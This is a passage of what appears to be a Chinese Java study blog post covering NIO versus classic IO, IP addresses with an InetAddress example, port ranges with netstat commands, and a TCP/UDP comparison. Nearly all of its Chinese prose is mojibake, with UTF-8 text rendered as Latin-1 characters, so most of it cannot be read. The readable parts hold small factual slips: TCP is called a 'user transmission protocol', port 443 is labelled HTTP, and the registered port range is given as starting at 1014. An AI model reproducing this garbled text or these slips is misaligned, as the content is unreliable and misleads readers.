<li><p>Pathæ¥å£</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/a82dd7550a4c16ef3ea37fc6aa8609a6--7334--image-20241002190644089.png" alt="image-20241002190644089"></p>
<ul>
<li>Files ç±»</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/8254c3f67ca2c7111a66692567b84c67--2a50--image-20241002191211308.png" alt="image-20241002191211308"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/ba3be1ca719cecb6fcccee7568a403d6--ec6a--image-20241002191223484.png" alt="image-20241002191223484"></p>
<blockquote>
<p>ä¸€äº›å¯¹äºNIOä¸IOçš„å¯¹æ¯”</p>
</blockquote>
<p>ä½œè€…ï¼šç»ˆç«¯ç ”å‘éƒ¨<br>é“¾æ¥ï¼š<a href="https://www.zhihu.com/question/439681246/answer/1753604983">https://www.zhihu.com/question/439681246/answer/1753604983</a><br>æ¥æºï¼šçŸ¥ä¹<br>è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p>
<p>NIOæ˜¯ä¸ºäº†å¼¥è¡¥IOæ“ä½œçš„ä¸è¶³è€Œè¯ç”Ÿçš„ï¼ŒNIOçš„ä¸€äº›æ–°ç‰¹æ€§æœ‰ï¼šéé˜»å¡I&#x2F;Oï¼Œé€‰æ‹©å™¨ï¼Œç¼“å†²ä»¥åŠç®¡é“ã€‚ç®¡é“ï¼ˆChannelï¼‰ï¼Œç¼“å†²ï¼ˆBufferï¼‰ ï¼Œé€‰æ‹©å™¨ï¼ˆ Selectorï¼‰æ˜¯å…¶ä¸»è¦ç‰¹å¾ã€‚</p>
<p><img src="https://picx.zhimg.com/80/v2-db587ee075af848892e64f137ea9fd5e_1440w.webp?source=1def8aca" alt="img"></p>
<h5 id="æ¦‚å¿µè§£é‡Šï¼š"><a href="#æ¦‚å¿µè§£é‡Šï¼š" class="headerlink" title="æ¦‚å¿µè§£é‡Šï¼š"></a>æ¦‚å¿µè§£é‡Šï¼š</h5><p>Channelâ€”â€”ç®¡é“å®é™…ä¸Šå°±åƒä¼ ç»ŸIOä¸­çš„æµï¼Œåˆ°ä»»ä½•ç›®çš„åœ°(æˆ–æ¥è‡ªä»»ä½•åœ°æ–¹)çš„æ‰€æœ‰æ•°æ®éƒ½å¿…é¡»é€šè¿‡ä¸€ä¸ª Channel å¯¹è±¡ã€‚ä¸€ä¸ª Buffer å®è´¨ä¸Šæ˜¯ä¸€ä¸ª<a href="https://zhida.zhihu.com/search?content_id=348917546&content_type=Answer&match_order=1&q=%E5%AE%B9%E5%99%A8%E5%AF%B9%E8%B1%A1&zhida_source=entity">å®¹å™¨å¯¹è±¡</a>ã€‚</p>
<p>Selectorâ€”â€”é€‰æ‹©å™¨ç”¨äºç›‘å¬å¤šä¸ªç®¡é“çš„äº‹ä»¶ï¼Œä½¿ç”¨ä¼ ç»Ÿçš„<a href="https://zhida.zhihu.com/search?content_id=348917546&content_type=Answer&match_order=1&q=%E9%98%BB%E5%A1%9EIO&zhida_source=entity">é˜»å¡IO</a>æ—¶æˆ‘ä»¬å¯ä»¥æ–¹ä¾¿çš„çŸ¥é“ä»€ä¹ˆæ—¶å€™å¯ä»¥è¿›è¡Œè¯»å†™ï¼Œè€Œä½¿ç”¨éé˜»å¡é€šé“ï¼Œæˆ‘ä»¬éœ€è¦ä¸€äº›æ–¹æ³•æ¥çŸ¥é“ä»€ä¹ˆæ—¶å€™é€šé“å‡†å¤‡å¥½äº†ï¼Œé€‰æ‹©å™¨æ­£æ˜¯ä¸ºè¿™ä¸ªéœ€è¦è€Œè¯ç”Ÿçš„ã€‚</p>
<h5 id="NIOå’Œä¼ ç»Ÿçš„IOæœ‰ä»€ä¹ˆåŒºåˆ«å‘¢"><a href="#NIOå’Œä¼ ç»Ÿçš„IOæœ‰ä»€ä¹ˆåŒºåˆ«å‘¢" class="headerlink" title="NIOå’Œä¼ ç»Ÿçš„IOæœ‰ä»€ä¹ˆåŒºåˆ«å‘¢?"></a>NIOå’Œä¼ ç»Ÿçš„IOæœ‰ä»€ä¹ˆåŒºåˆ«å‘¢?</h5><p><strong>1ï¼ŒIOæ˜¯é¢å‘æµçš„ï¼ŒNIOæ˜¯é¢å‘å—ï¼ˆç¼“å†²åŒºï¼‰çš„ã€‚</strong></p>
<p>IOé¢å‘æµçš„æ“ä½œä¸€æ¬¡ä¸€ä¸ªå­—èŠ‚åœ°å¤„ç†æ•°æ®ã€‚ä¸€ä¸ªè¾“å…¥æµäº§ç”Ÿä¸€ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œä¸€ä¸ªè¾“å‡ºæµæ¶ˆè´¹ä¸€ä¸ªå­—èŠ‚çš„æ•°æ®ã€‚ï¼Œå¯¼è‡´äº†æ•°æ®çš„è¯»å–å’Œå†™å…¥æ•ˆç‡ä¸ä½³ï¼›</p>
<p>NIOé¢å‘å—çš„æ“ä½œåœ¨ä¸€æ­¥ä¸­äº§ç”Ÿæˆ–è€…æ¶ˆè´¹ä¸€ä¸ªæ•°æ®å—ã€‚æŒ‰å—å¤„ç†æ•°æ®æ¯”æŒ‰(æµå¼çš„)å­—èŠ‚å¤„ç†æ•°æ®è¦å¿«å¾—å¤šï¼ŒåŒæ—¶æ•°æ®è¯»å–åˆ°ä¸€ä¸ªå®ƒç¨åå¤„ç†çš„ç¼“å†²åŒºï¼Œéœ€è¦æ—¶å¯åœ¨ç¼“å†²åŒºä¸­å‰åç§»åŠ¨ã€‚è¿™å°±å¢åŠ äº†å¤„ç†è¿‡ç¨‹ä¸­çš„çµæ´»æ€§ã€‚é€šä¿—æ¥è¯´ï¼ŒNIOé‡‡å–äº†â€œé¢„è¯»â€çš„æ–¹å¼ï¼Œå½“ä½ è¯»å–æŸä¸€éƒ¨åˆ†æ•°æ®æ—¶ï¼Œä»–å°±ä¼šçŒœæµ‹ä½ ä¸‹ä¸€æ­¥å¯èƒ½ä¼šè¯»å–çš„æ•°æ®è€Œé¢„å…ˆç¼“å†²ä¸‹æ¥ã€‚</p>
<p><strong>2ï¼ŒIOæ˜¯é˜»å¡çš„ï¼ŒNIOæ˜¯éé˜»å¡çš„ã€‚</strong></p>
<p>å¯¹äºä¼ ç»Ÿçš„IOï¼Œå½“ä¸€ä¸ªçº¿ç¨‹è°ƒç”¨read() æˆ– write()æ—¶ï¼Œè¯¥çº¿ç¨‹è¢«é˜»å¡ï¼Œç›´åˆ°æœ‰ä¸€äº›æ•°æ®è¢«è¯»å–ï¼Œæˆ–æ•°æ®å®Œå…¨å†™å…¥ã€‚è¯¥çº¿ç¨‹åœ¨æ­¤æœŸé—´ä¸èƒ½å†å¹²ä»»ä½•äº‹æƒ…äº†ã€‚</p>
<p>è€Œå¯¹äºNIOï¼Œä½¿ç”¨ä¸€ä¸ªçº¿ç¨‹å‘é€è¯»å–æ•°æ®è¯·æ±‚ï¼Œæ²¡æœ‰å¾—åˆ°å“åº”ä¹‹å‰ï¼Œçº¿ç¨‹æ˜¯ç©ºé—²çš„ï¼Œæ­¤æ—¶çº¿ç¨‹å¯ä»¥å»æ‰§è¡Œåˆ«çš„ä»»åŠ¡ï¼Œè€Œä¸æ˜¯åƒIOä¸­é‚£æ ·åªèƒ½ç­‰å¾…å“åº”å®Œæˆã€‚</p>
<p><strong>3ï¼ŒNIOå’ŒIOé€‚ç”¨åœºæ™¯</strong></p>
<p>NIOæ˜¯ä¸ºå¼¥è¡¥ä¼ ç»ŸIOçš„ä¸è¶³è€Œè¯ç”Ÿçš„ï¼Œä½†æ˜¯<a href="https://link.zhihu.com/?target=https://www.baidu.com/s?wd=%E5%B0%BA%E6%9C%89%E6%89%80%E7%9F%AD&tn=24004469_oem_dg&rsv_dl=gh_pl_sl_csd">å°ºæœ‰æ‰€çŸ­</a><a href="https://link.zhihu.com/?target=https://www.baidu.com/s?wd=%E5%AF%B8%E6%9C%89%E6%89%80%E9%95%BF&tn=24004469_oem_dg&rsv_dl=gh_pl_sl_csd">å¯¸æœ‰æ‰€é•¿</a>ï¼ŒNIOä¹Ÿæœ‰ç¼ºç‚¹ï¼Œå› ä¸ºNIOæ˜¯é¢å‘ç¼“å†²åŒºçš„æ“ä½œï¼Œæ¯ä¸€æ¬¡çš„æ•°æ®å¤„ç†éƒ½æ˜¯å¯¹ç¼“å†²åŒºè¿›è¡Œçš„ï¼Œé‚£ä¹ˆå°±ä¼šæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨æ•°æ®å¤„ç†ä¹‹å‰å¿…é¡»è¦åˆ¤æ–­ç¼“å†²åŒºçš„æ•°æ®æ˜¯å¦å®Œæ•´æˆ–è€…å·²ç»è¯»å–å®Œæ¯•ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå‡è®¾æ•°æ®åªè¯»å–äº†ä¸€éƒ¨åˆ†ï¼Œé‚£ä¹ˆå¯¹ä¸å®Œæ•´çš„æ•°æ®å¤„ç†æ²¡æœ‰ä»»ä½•æ„ä¹‰ã€‚æ‰€ä»¥æ¯æ¬¡æ•°æ®å¤„ç†ä¹‹å‰éƒ½è¦æ£€æµ‹ç¼“å†²åŒºæ•°æ®ã€‚</p>
<p><strong>é‚£ä¹ˆNIOå’ŒIOå„é€‚ç”¨çš„åœºæ™¯æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</strong></p>
<p>å¦‚æœéœ€è¦ç®¡ç†åŒæ—¶æ‰“å¼€çš„<a href="https://link.zhihu.com/?target=https://www.baidu.com/s?wd=%E6%88%90%E5%8D%83%E4%B8%8A%E4%B8%87&tn=24004469_oem_dg&rsv_dl=gh_pl_sl_csd">æˆåƒä¸Šä¸‡</a>ä¸ªè¿æ¥ï¼Œè¿™äº›è¿æ¥æ¯æ¬¡åªæ˜¯å‘é€å°‘é‡çš„æ•°æ®ï¼Œä¾‹å¦‚<a href="https://zhida.zhihu.com/search?content_id=348917546&content_type=Answer&match_order=1&q=%E8%81%8A%E5%A4%A9%E6%9C%8D%E5%8A%A1%E5%99%A8&zhida_source=entity">èŠå¤©æœåŠ¡å™¨</a>ï¼Œè¿™æ—¶å€™ç”¨NIOå¤„ç†æ•°æ®å¯èƒ½æ˜¯ä¸ªå¾ˆå¥½çš„é€‰æ‹©ã€‚</p>
<p>è€Œå¦‚æœåªæœ‰å°‘é‡çš„è¿æ¥ï¼Œè€Œè¿™äº›è¿æ¥æ¯æ¬¡è¦å‘é€å¤§é‡çš„æ•°æ®ï¼Œè¿™æ—¶å€™ä¼ ç»Ÿçš„IOæ›´åˆé€‚ã€‚ä½¿ç”¨å“ªç§å¤„ç†æ•°æ®ï¼Œéœ€è¦åœ¨æ•°æ®çš„å“åº”ç­‰å¾…æ—¶é—´å’Œæ£€æŸ¥ç¼“å†²åŒºæ•°æ®çš„æ—¶é—´ä¸Šä½œæ¯”è¾ƒæ¥æƒè¡¡é€‰æ‹©ã€‚</p>
<p><strong>4ï¼Œé€šä¿—è§£é‡Š</strong></p>
<h5 id="æœ€åï¼Œå¯¹äºNIOå’Œä¼ ç»ŸIOï¼Œæœ‰ä¸€ä¸ªç½‘å‹è®²çš„ç”ŸåŠ¨çš„ä¾‹å­ï¼š"><a href="#æœ€åï¼Œå¯¹äºNIOå’Œä¼ ç»ŸIOï¼Œæœ‰ä¸€ä¸ªç½‘å‹è®²çš„ç”ŸåŠ¨çš„ä¾‹å­ï¼š" class="headerlink" title="æœ€åï¼Œå¯¹äºNIOå’Œä¼ ç»ŸIOï¼Œæœ‰ä¸€ä¸ªç½‘å‹è®²çš„ç”ŸåŠ¨çš„ä¾‹å­ï¼š"></a>æœ€åï¼Œå¯¹äºNIOå’Œä¼ ç»ŸIOï¼Œæœ‰ä¸€ä¸ªç½‘å‹è®²çš„ç”ŸåŠ¨çš„ä¾‹å­ï¼š</h5><p>ä»¥å‰çš„æµæ€»æ˜¯å µå¡çš„ï¼Œä¸€ä¸ªçº¿ç¨‹åªè¦å¯¹å®ƒè¿›è¡Œæ“ä½œï¼Œå…¶å®ƒæ“ä½œå°±ä¼šè¢«å µå¡ï¼Œä¹Ÿå°±ç›¸å½“äºæ°´ç®¡æ²¡æœ‰é˜€é—¨ï¼Œä½ ä¼¸æ‰‹æ¥æ°´çš„æ—¶å€™ï¼Œä¸ç®¡æ°´åˆ°äº†æ²¡æœ‰ï¼Œä½ å°±éƒ½åªèƒ½è€—åœ¨æ¥æ°´ï¼ˆæµï¼‰ä¸Šã€‚</p>
<p>nioçš„Channelçš„åŠ å…¥ï¼Œç›¸å½“äºå¢åŠ äº†æ°´é¾™å¤´ï¼ˆæœ‰é˜€é—¨ï¼‰ï¼Œè™½ç„¶ä¸€ä¸ªæ—¶åˆ»ä¹Ÿåªèƒ½æ¥ä¸€ä¸ªæ°´ç®¡çš„æ°´ï¼Œä½†ä¾èµ–è½®æ¢ç­–ç•¥ï¼Œåœ¨æ°´é‡ä¸å¤§çš„æ—¶å€™ï¼Œå„ä¸ªæ°´ç®¡é‡Œæµå‡ºæ¥çš„æ°´ï¼Œéƒ½å¯ä»¥å¾—åˆ°å¦¥</p>
<p>å–„æ¥çº³ï¼Œè¿™ä¸ªå…³é”®ä¹‹å¤„å°±æ˜¯å¢åŠ äº†ä¸€ä¸ªæ¥æ°´å·¥ï¼Œä¹Ÿå°±æ˜¯Selectorï¼Œä»–è´Ÿè´£åè°ƒï¼Œä¹Ÿå°±æ˜¯çœ‹å“ªæ ¹æ°´ç®¡æœ‰æ°´äº†çš„è¯ï¼Œåœ¨å½“å‰æ°´ç®¡çš„æ°´æ¥åˆ°ä¸€å®šç¨‹åº¦çš„æ—¶å€™ï¼Œå°±åˆ‡æ¢ä¸€ä¸‹ï¼šä¸´æ—¶å…³ä¸Šå½“å‰æ°´é¾™å¤´ï¼Œè¯•ç€æ‰“å¼€å¦ä¸€ä¸ªæ°´é¾™å¤´ï¼ˆçœ‹çœ‹æœ‰æ²¡æœ‰æ°´ï¼‰ã€‚</p>
<p>å½“å…¶ä»–äººéœ€è¦ç”¨æ°´çš„æ—¶å€™ï¼Œä¸æ˜¯ç›´æ¥å»æ¥æ°´ï¼Œè€Œæ˜¯äº‹å‰æäº†ä¸€ä¸ªæ°´æ¡¶ç»™æ¥æ°´å·¥ï¼Œè¿™ä¸ªæ°´æ¡¶å°±æ˜¯Bufferã€‚ä¹Ÿå°±æ˜¯ï¼Œå…¶ä»–äººè™½ç„¶ä¹Ÿå¯èƒ½è¦ç­‰ï¼Œä½†ä¸ä¼šåœ¨ç°åœºç­‰ï¼Œè€Œæ˜¯å›å®¶ç­‰ï¼Œå¯ä»¥åšå…¶å®ƒäº‹å»ï¼Œæ°´æ¥æ»¡äº†ï¼Œæ¥æ°´å·¥ä¼šé€šçŸ¥ä»–ä»¬ã€‚</p>
<p>è¿™å…¶å®ä¹Ÿæ˜¯éå¸¸æ¥è¿‘å½“å‰ç¤¾ä¼šåˆ†å·¥ç»†åŒ–çš„ç°å®ï¼Œä¹Ÿæ˜¯ç»Ÿåˆ†åˆ©ç”¨ç°æœ‰èµ„æºè¾¾åˆ°å¹¶å‘æ•ˆæœçš„ä¸€ç§å¾ˆç»æµçš„æ‰‹æ®µï¼Œè€Œä¸æ˜¯åŠ¨ä¸åŠ¨å°±æ¥ä¸ªå¹¶è¡Œå¤„ç†ï¼Œè™½ç„¶é‚£æ ·æ˜¯æœ€ç®€å•çš„ï¼Œä½†ä¹Ÿæ˜¯æœ€æµªè´¹èµ„æºçš„æ–¹å¼ã€‚</p>
<h2 id="ç½‘ç»œç¼–ç¨‹"><a href="#ç½‘ç»œç¼–ç¨‹" class="headerlink" title="ç½‘ç»œç¼–ç¨‹"></a>ç½‘ç»œç¼–ç¨‹</h2><h3 id="1-æ¦‚è¿°-1"><a href="#1-æ¦‚è¿°-1" class="headerlink" title="1.æ¦‚è¿°"></a>1.æ¦‚è¿°</h3><p>é‚®ä»¶ï¼š</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/cf09b1139d0685d05e0de851fd49a94d--4166--image-20241002192704353.png" alt="image-20241002192704353"></p>
<ul>
<li>è®¡ç®—æœºç½‘ç»œï¼š è®¡ç®—æœºç½‘ç»œæ˜¯æŒ‡å°†<a href="https://baike.baidu.com/item/%E5%9C%B0%E7%90%86">åœ°ç†</a>ä½ç½®ä¸åŒçš„å…·æœ‰ç‹¬ç«‹åŠŸèƒ½çš„å¤šå°<a href="https://baike.baidu.com/item/%E8%AE%A1%E7%AE%97%E6%9C%BA/140338">è®¡ç®—æœº</a>åŠå…¶å¤–éƒ¨è®¾å¤‡ï¼Œé€šè¿‡é€šä¿¡çº¿è·¯è¿æ¥èµ·æ¥ï¼Œåœ¨<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/3997">ç½‘ç»œæ“ä½œç³»ç»Ÿ</a>ï¼Œ<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6/6579078">ç½‘ç»œç®¡ç†è½¯ä»¶</a>åŠ<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE/4438611">ç½‘ç»œé€šä¿¡åè®®</a>çš„ç®¡ç†å’Œåè°ƒä¸‹ï¼Œå®ç°<a href="https://baike.baidu.com/item/%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB/233480">èµ„æºå…±äº«</a>å’Œä¿¡æ¯ä¼ é€’çš„è®¡ç®—æœºç³»ç»Ÿã€‚ </li>
<li>ç½‘ç»œç¼–ç¨‹çš„ç›®çš„ï¼šæ— çº¿ç”µå°â€¦ä¼ æ’­äº¤æµä¿¡æ¯ï¼Œæ•°æ®äº¤æ¢ï¼Œé€šä¿¡ã€‚</li>
<li><strong>æƒ³è¦è¾¾åˆ°è¿™ä¸ªæ•ˆæœéœ€è¦ä»€ä¹ˆï¼š</strong><ol>
<li>å¦‚ä½•è®©å‡†ç¡®çš„å®šä½ç½‘ç»œä¸Šçš„ä¸€å°ä¸»æœº 192.168.16.124ï¼šç«¯å£ï¼Œ å®šä½ä¸Šè¿™ä¸ªè®¡ç®—æœºä¸Šçš„æŸä¸ªèµ„æºã€‚</li>
<li>æ‰¾åˆ°äº†è¿™ä¸ªä¸»æœºï¼Œå¦‚ä½•ä¼ è¾“æ•°æ®å‘¢ï¼Ÿ</li>
</ol>
</li>
<li>Javaweb:ç½‘é¡µç¼–ç¨‹ ã€ B&#x2F;Sæ¶æ„</li>
<li>ç½‘ç»œç¼–ç¨‹ï¼šTCP&#x2F;IP ã€ C&#x2F;S</li>
</ul>
<h3 id="2-ç½‘ç»œé€šä¿¡è¦ç´ "><a href="#2-ç½‘ç»œé€šä¿¡è¦ç´ " class="headerlink" title="2.ç½‘ç»œé€šä¿¡è¦ç´ "></a>2.ç½‘ç»œé€šä¿¡è¦ç´ </h3><p><strong>å¦‚ä½•å®ç°ç½‘ç»œçš„é€šä¿¡ï¼Ÿ</strong></p>
<ul>
<li>é€šä¿¡åŒæ–¹çš„åœ°å€ï¼š<ul>
<li>ipï¼š192.168.16.124</li>
<li>ç«¯å£ï¼š5900</li>
</ul>
</li>
<li><strong>è§„åˆ™ï¼šç½‘ç»œé€šä¿¡çš„åè®®</strong>ï¼šTCP&#x2F;IP</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/1248aa7b160d777171d9816f1f8e182c--de8e--image-20241002192722608.png" alt="image-20241002192722608"></p>
<blockquote>
<p>å°ç»“ï¼š</p>
</blockquote>
<ol>
<li>ç½‘ç»œç¼–ç¨‹ä¸­æœ‰ä¸¤ä¸ªä¸»è¦çš„é—®é¢˜ï¼š<ul>
<li>å¦‚ä½•è®©å‡†ç¡®çš„å®šä½åˆ°ç½‘ç»œä¸Šçš„ä¸€å°æˆ–å¤šå°ä¸»æœºï¼›</li>
<li>æ‰¾åˆ°ä¸»æœºä¹‹åå¦‚ä½•é€šä¿¡ï¼›</li>
</ul>
</li>
<li>ç½‘ç»œç¼–ç¨‹ä¸­çš„è¦ç´ ï¼š<ul>
<li>IPå’Œç«¯å£å·ï¼šIP</li>
<li>ç½‘ç»œé€šä¿¡åè®®ï¼šUDPã€TCP</li>
</ul>
</li>
<li>ä¸‡ç‰©çš†å¯¹è±¡</li>
</ol>
<h3 id="3-IP"><a href="#3-IP" class="headerlink" title="3.IP"></a>3.IP</h3><p>IP åœ°å€ï¼šInetAddress</p>
<ul>
<li><p>å”¯ä¸€å®šä½ä¸€å°ç½‘ç»œä¸Šçš„è®¡ç®—æœº</p>
</li>
<li><p>127.0.0.1ï¼š æœ¬æœºlocalhost</p>
</li>
<li><p>ipåœ°å€çš„çˆ¶ç±»</p>
<ul>
<li>&#x3D;&#x3D;IPV4&#x3D;&#x3D;ï¼š 127.0.0.1 ,4ä¸ªå­—èŠ‚ç»„æˆã€‚ï¼Œ0<del>255ï¼Œ 42äº¿</del>ï¼›30äº¿éƒ½åœ¨åŒ—ç¾ï¼Œäºšæ´²4äº¿ã€‚2011å¹´å°±ç”¨å°½ï¼›</li>
<li>&#x3D;&#x3D;IPV6&#x3D;&#x3D;ï¼š fe80::f0e0:7383:ad8e:f32f%3 ï¼Œ128ä½ã€‚8ä¸ªæ— ç¬¦å·æ•´æ•°</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">2406</span>:da18:ddf:<span class="number">4000</span>:67d5:b226:cad7:125b</span><br></pre></td></tr></table></figure>
</li>
<li><p>å…¬ç½‘ï¼ˆäº’è”ç½‘ï¼‰â€“ç§ç½‘ï¼ˆå±€åŸŸç½‘ï¼‰</p>
<ul>
<li><p><a href="https://www.jb51.net/network/579228.html">ABCDåœ°å€</a></p>
</li>
<li><p>192.168.xx.xx,ä¸“é—¨ç»™ç»„ç»‡å†…éƒ¨ä½¿ç”¨ã€‚</p>
</li>
</ul>
</li>
<li><p>åŸŸåï¼šè®°å¿†IPé—®é¢˜ï¼</p>
<ul>
<li>IPï¼š<a href="http://www.vip.com/">www.vip.com</a></li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.UnknownHostException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestInetAddress</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InetAddress</span> <span class="variable">byName</span> <span class="operator">=</span> InetAddress.getByName(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">            System.out.println(byName);</span><br><span class="line">            <span class="type">InetAddress</span> <span class="variable">byName2</span> <span class="operator">=</span> InetAddress.getByName(<span class="string">&quot;localhost&quot;</span>);</span><br><span class="line">            System.out.println(byName2);</span><br><span class="line">            <span class="type">InetAddress</span> <span class="variable">localHost</span> <span class="operator">=</span> InetAddress.getLocalHost();</span><br><span class="line">            System.out.println(localHost);</span><br><span class="line"></span><br><span class="line">            <span class="type">InetAddress</span> <span class="variable">byName1</span> <span class="operator">=</span> InetAddress.getByName(<span class="string">&quot;www.taobao.com&quot;</span>);</span><br><span class="line">            System.out.println(byName1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">/<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">localhost/<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">6pc1/<span class="number">192.168</span><span class="number">.56</span><span class="number">.1</span></span><br><span class="line">www.taobao.com/<span class="number">221.228</span><span class="number">.217</span><span class="number">.213</span></span><br></pre></td></tr></table></figure>

<h3 id="4-ç«¯å£"><a href="#4-ç«¯å£" class="headerlink" title="4.ç«¯å£"></a>4.ç«¯å£</h3><ul>
<li><p>ç«¯å£è¡¨ç¤ºè®¡ç®—æœºä¸Šä¸€ä¸ªç¨‹åºçš„è¿›ç¨‹ï¼›</p>
</li>
<li><p>ä¸åŒçš„è¿›ç¨‹æœ‰ä¸åŒçš„ç«¯å£å·ï¼ç”¨æ¥åŒºåˆ†è½¯ä»¶ï¼</p>
</li>
<li><p>è¢«è§„å®š0~65535</p>
</li>
<li><p>TCPï¼ŒUDPï¼š65535*2ä¸ªç«¯å£ tcpï¼š80 udpï¼š80 å•ä¸ªåè®®ä¸‹ï¼Œç«¯å£å·ä¸èƒ½å†²çª</p>
</li>
<li><p>ç«¯å£åˆ†ç±»</p>
<ul>
<li>å…±æœ‰ç«¯å£ 0~1023 å†…ç½®çš„è¿›ç¨‹ä½¿ç”¨<ul>
<li>HTTPï¼š80</li>
<li>HTTPï¼š443 å¦‚è®¿é—®httpsï¼š&#x2F;&#x2F;<a href="http://www.baidu.com:443/">www.baidu.com:443</a> è®¿é—®çš„è¿˜æ˜¯ç™¾åº¦</li>
<li>FTPï¼š21</li>
<li>TELENTï¼š23</li>
</ul>
</li>
<li>ç¨‹åºæ³¨å†Œç«¯å£ï¼š1014-49151ï¼Œåˆ†é…ç»™ç”¨æˆ·å’Œç¨‹åº<ul>
<li>Tomcatï¼š8080</li>
<li>MySqlï¼š3306</li>
<li>Oracleï¼š1521</li>
</ul>
</li>
<li>åŠ¨æ€ã€ç§æœ‰ç«¯å£ï¼š49152~65535</li>
</ul>
</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netstat -ano #æŸ¥çœ‹æ‰€æœ‰çš„ç«¯å£</span><br><span class="line">netstat -nao|<span class="built_in">findstr</span> &quot;<span class="number">7808</span>&quot; #æŸ¥çœ‹æŒ‡å®šçš„ç«¯å£</span><br><span class="line">tasklist|<span class="built_in">findstr</span> &quot;<span class="number">8696</span>&quot;</span><br></pre></td></tr></table></figure>

<h3 id="5-é€šä¿¡åè®®"><a href="#5-é€šä¿¡åè®®" class="headerlink" title="5.é€šä¿¡åè®®"></a>5.é€šä¿¡åè®®</h3><p>åè®®ï¼šçº¦å®šï¼Œå°±å¥½æ¯”ä¸­å›½äººäº¤æµè¯´çš„æ˜¯æ™®é€šè¯</p>
<p><strong>ç½‘ç»œé€šä¿¡åè®®ï¼š</strong> é€Ÿç‡ï¼Œä¼ è¾“ç ç‡ï¼Œä»£ç ç»“æ„ï¼Œä¼ è¾“æ§åˆ¶â€¦</p>
<p><strong>é—®é¢˜</strong>ï¼šéå¸¸çš„å¤æ‚</p>
<p>å¤§äº‹åŒ–å°ï¼šåˆ†å±‚</p>
<p><strong>TCP&#x2F;IPåè®®ç°‡ï¼šå®é™…ä¸Šæ˜¯ä¸€ç»„åè®®</strong></p>
<p>é‡è¦ï¼š</p>
<ul>
<li>TCPï¼šç”¨æˆ·ä¼ è¾“åè®®</li>
<li>UDPï¼šç”¨æˆ·æ•°æ®æŠ¥åè®®</li>
</ul>
<p>å‡ºåçš„åè®®ï¼š</p>
<ul>
<li>TCPï¼š</li>
<li>IPï¼šç½‘ç»œäº’è”åè®®</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/f1c84981f8b01587eff9be2fc64dd7a6--6362--image-20241002193643594.png" alt="image-20241002193643594"></p>
<p>CP UDP å¯¹æ¯”**</p>
<ul>
<li><p>TCPï¼šæ‰“ç”µè¯</p>
<ul>
<li><p>è¿æ¥ï¼Œç¨³å®š</p>
</li>
<li><p>ä¸‰æ¬¡æ¡æ‰‹ï¼Œå››æ¬¡æŒ¥æ‰‹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">æœ€å°‘éœ€è¦ä¸‰æ¬¡ï¼Œä¿è¯ç¨³å®šè¿æ¥ï¼</span><br><span class="line">Aï¼šä½ ç…å•¥ï¼Ÿ</span><br><span class="line">Bï¼šç…ä½ å’‹åœ°ï¼Ÿ</span><br><span class="line">Aï¼šå¹²ä¸€åœº</span><br><span class="line"></span><br><span class="line">Aï¼šæˆ‘è¦åˆ†æ‰‹äº†</span><br><span class="line">Bï¼šæˆ‘çŸ¥é“ä½ è¦åˆ†æ‰‹äº†</span><br><span class="line">Bï¼šä½ çœŸçš„è¦åˆ†æ‰‹å—ï¼Ÿ</span><br><span class="line">Aï¼šæˆ‘çœŸçš„è¦åˆ†æ‰‹äº†</span><br></pre></td></tr></table></figure>
</li>
<li><p>å®¢æˆ·ç«¯ã€æœåŠ¡å™¨</p>
</li>
<li><p>ä¼ è¾“å®Œæˆï¼Œé‡Šæ”¾è¿æ¥ï¼Œæ•ˆç‡ä½</p>
</li>
</ul>
</li>
<li><p>UDP;å‘çŸ­ä¿¡</p>
<ul>
<li>ä¸è¿æ¥ï¼Œä¸ç¨³å®š</li>
<li>å®¢æˆ·ç«¯ã€æœåŠ¡ç«¯ï¼šæ²¡æœ‰æ˜ç¡®çš„è§£ç°</li>
